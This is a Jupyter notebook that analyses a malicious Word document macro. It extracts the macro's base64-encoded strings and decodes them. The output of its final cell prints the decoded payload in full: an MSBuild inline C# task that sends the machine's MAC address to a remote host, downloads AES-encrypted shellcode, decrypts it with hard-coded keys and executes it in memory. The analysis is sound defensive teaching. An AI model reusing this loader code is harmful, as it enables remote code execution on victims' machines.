{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## This is a sample Jupyter notebook that analyzes a base64 encoded payload in a malicous .doc VBA macro\n",
    "\n",
    "Fetch the malicious macro text as noted in the tweet https://twitter.com/JohnLaTwC/status/1089572501523378176\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Fetched 20453 bytes\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    " \n",
    "url = \"https://gist.githubusercontent.com/JohnLaTwC/230485a13c49501279e023ad4b9510e2/raw/6dccac89d73030cc4c69c2edbfb9a5557482c76c/9e910797589da01a4b13ecb7fcd58f81dfc18784dd6ed4996e5a5f8f1f95e224\"\n",
    "r = requests.get(url)\n",
    "print (f\"Fetched {len(r.content)} bytes\")\n",
    "macro_text = r.content.decode()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### There are many lines like this that contain an encoded payload.  Let's extract them\n",
    "\n",
    "```\n",
    "decodeBase64(\"c0V4YW1wbGU...\");\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "encoded_lines = [s for s in macro_text.split() if 'decodeBase64(\"' in s]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'decodeBase64(\"PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogICAgPFRhcmdldCBOYW1lPSJIZWxsbyI+CiAgICAgICAgPENsYXM=\");'"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# show example line\n",
    "encoded_lines[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Let's extract just the base64 encoded content\n",
    "We'll do this by using a regex to match the call to decodeBase64 in the macro with the b64 encoded literal string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'PFByb2plY3QgVG9vbHNWZXJzaW9uPSI0LjAiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL2RldmVsb3Blci9tc2J1aWxkLzIwMDMiPgogICAgPFRhcmdldCBOYW1lPSJIZWxsbyI+CiAgICAgICAgPENsYXM='"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# example extracting the b64 literal string using re.match  \n",
    "\n",
    "import re \n",
    "demo_line = encoded_lines[0]\n",
    "match_obj = re.match(r'decodeBase64\\(\"(.*)\"\\);', demo_line,re.M|re.I)\n",
    "decode = ''\n",
    "if match_obj is not None:\n",
    "    decode = match_obj.group(1)\n",
    "decode "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Now decode it\n",
    "The output from the previous Jupyter command is stored in a variable named underscore (_).  Pass that into Python's base64 decode function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\\n    <Target Name=\"Hello\">\\n        <Clas'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# You should see a decoded line that starts the XML header on a MSBuild file: <Project ...\n",
    "import base64\n",
    "base64.b64decode(_).decode()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n",
      "    <Target Name=\"Hello\">\n",
      "        <Clas\n",
      "sExample />\n",
      "    </Target>\n",
      "    <UsingTask\n",
      "        TaskName=\"ClassExample\"\n",
      "        TaskFactory=\"CodeTaskFactory\"\n",
      "        AssemblyF\n",
      "ile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >\n",
      "            <Task>\n",
      "        <Code Type=\"Clas\n",
      "s\" Language=\"cs\">\n",
      "            <![CDATA[\n",
      "                using System;\n",
      "                using Microsoft.Build.Framework;\n",
      "         \n",
      "       using Microsoft.Build.Utilities;\n",
      "                using System.Runtime.InteropServices;\n",
      "                using System.Net;\n",
      "\n",
      "                using System.Net.NetworkInformation;\n",
      "                using System.IO;\n",
      "                using System.Linq;\n",
      "       \n",
      "         using System.Security.Cryptography;\n",
      "\n",
      "                public class ClassExample :  Task, ITask\n",
      "                {\n",
      "       \n",
      "             [Flags]\n",
      "                    public enum AllocationType : uint\n",
      "                    {\n",
      "                        COMMIT \n",
      "= 0x1000,\n",
      "                        RESERVE = 0x2000,\n",
      "                        RESET = 0x80000,\n",
      "                        LARGE_PAGES\n",
      " = 0x20000000,\n",
      "                        PHYSICAL = 0x400000,\n",
      "                        TOP_DOWN = 0x100000,\n",
      "                       \n",
      " WRITE_WATCH = 0x200000\n",
      "                    }\n",
      "\n",
      "                    [Flags]\n",
      "                    public enum MemoryProtection : ui\n",
      "nt\n",
      "                    {\n",
      "                        EXECUTE = 0x10,\n",
      "                        EXECUTE_READ = 0x20,\n",
      "                  \n",
      "      EXECUTE_READWRITE = 0x40,\n",
      "                        EXECUTE_WRITECOPY = 0x80,\n",
      "                        NOACCESS = 0x01,\n",
      "     \n",
      "                   READONLY = 0x02,\n",
      "                        READWRITE = 0x04,\n",
      "                        WRITECOPY = 0x08,\n",
      "        \n",
      "                GUARD_Modifierflag = 0x100,\n",
      "                        NOCACHE_Modifierflag = 0x200,\n",
      "                        WRITEC\n",
      "OMBINE_Modifierflag = 0x400\n",
      "                    }\n",
      "\n",
      "                    [DllImport(\"kernel32.dll\", SetLastError = true)]\n",
      "        \n",
      "            static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtectio\n",
      "n flProtect);\n",
      "\n",
      "                    [DllImport(\"kernel32\")]\n",
      "                    private static extern IntPtr CreateThread(\n",
      "      \n",
      "                  IntPtr lpThreadAttributes,\n",
      "                        UInt32 dwStackSize,\n",
      "                        IntPtr lpStartA\n",
      "ddress,\n",
      "                        IntPtr param,\n",
      "                        UInt32 dwCreationFlags,\n",
      "                        IntPtr lpT\n",
      "hreadId\n",
      "                    );\n",
      "\n",
      "                    [DllImport(\"kernel32\")]\n",
      "                    private static extern UInt32 Wai\n",
      "tForSingleObject(\n",
      "                        IntPtr hHandle,\n",
      "                        UInt32 dwMilliseconds\n",
      "                    );\n",
      "\n",
      "\n",
      "                    [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]\n",
      "                    public delegate Int32 Execu\n",
      "teDelegate();\n",
      "\n",
      "                    public void Preprocess()\n",
      "                    {   \n",
      "\n",
      "                        try\n",
      "              \n",
      "          {\n",
      "                            var macAddr = \n",
      "                            (\n",
      "                                from nic in\n",
      " NetworkInterface.GetAllNetworkInterfaces()\n",
      "                                where nic.OperationalStatus == OperationalStatus.Up\n",
      "\n",
      "                                select nic.GetPhysicalAddress().ToString()\n",
      "                            ).FirstOrDefault();\n",
      "\n",
      "    \n",
      "                        String url = String.Format(\"https://foo.com/path?cid={0}\", macAddr);\n",
      "\n",
      "                            using \n",
      "(WebClient client = new WebClient())\n",
      "                            {\n",
      "                                using (Stream stream = client\n",
      ".OpenRead(url))\n",
      "                                {\n",
      "                                    byte[] sc = DrainPipe(stream);\n",
      "           \n",
      "                         \n",
      "                                    IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, Al\n",
      "locationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);\n",
      "                                    Marshal.C\n",
      "opy(sc, 0, (IntPtr)(funcAddr), sc.Length);\n",
      "\n",
      "                                    IntPtr hThread = IntPtr.Zero;\n",
      "\n",
      "                 \n",
      "                   hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);\n",
      "                              \n",
      "      WaitForSingleObject(hThread, 0xFFFFFFFF);\n",
      "                                }\n",
      "                            }\n",
      "                \n",
      "        }\n",
      "                        catch (Exception) {}                        \n",
      "                    }\n",
      "\n",
      "                    public\n",
      " static byte[] DrainPipe(Stream stream)\n",
      "                    {\n",
      "                        byte[] buffer = new byte[2048];\n",
      "          \n",
      "              byte[] iv = new byte[16] { 0x6b,0x18,0xb7,0x15,0x43,0xab,0xc3,0x30,0xe9,0x6d,0xa5,0xea,0x57,0x35,0xc6,0xf1 };\n",
      "    \n",
      "                    byte[] key = new byte[16] { 0x7a,0x79,0xa7,0xe2,0x3a,0x5c,0x9c,0xe4,0x2a,0x13,0x8,0xe8,0xba,0xc7,0x65,0xae }\n",
      ";\n",
      "\n",
      "                        Aes encryptor = Aes.Create();\n",
      "                        encryptor.Mode = CipherMode.CBC;\n",
      "              \n",
      "          encryptor.Padding = PaddingMode.PKCS7;\n",
      "                        encryptor.Key = key;\n",
      "                        encryptor.\n",
      "IV = iv;\n",
      "                        ICryptoTransform decryptor = encryptor.CreateDecryptor();\n",
      "                        \n",
      "            \n",
      "            using (MemoryStream ms = new MemoryStream())\n",
      "                        {\n",
      "                            using (CryptoStre\n",
      "am cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Write))\n",
      "                            {\n",
      "                                w\n",
      "hile (true)\n",
      "                                {\n",
      "                                    int read = stream.Read(buffer, 0, buffer.Lengt\n",
      "h);\n",
      "                                    if (read <= 0)\n",
      "                                    {\n",
      "                                   \n",
      "     cs.FlushFinalBlock();\n",
      "                                        return ms.ToArray();\n",
      "                                    }\n",
      "  \n",
      "                                      \n",
      "                                    cs.Write(buffer, 0, read);\n",
      "                          \n",
      "      }\n",
      "                            }\n",
      "                        }\n",
      "                    }\n",
      "\n",
      "                    public override bool \n",
      "Execute()\n",
      "                    {\n",
      "                        Preprocess();\n",
      "                        return true;\n",
      "                    }\n",
      "\n",
      "                }\n",
      "                ]]>\n",
      "            </Code>\n",
      "        </Task>\n",
      "    </UsingTask>\n",
      "</Project>\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# let's put it all together and run this extraction and decode over every line in the macro\n",
    "import re\n",
    "import base64\n",
    "for s in encoded_lines:\n",
    "    match_obj = re.match(r'decodeBase64\\(\"(.*)\"\\);', s)\n",
    "    if match_obj is not None:\n",
    "        print(base64.b64decode(match_obj.group(1)).decode())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
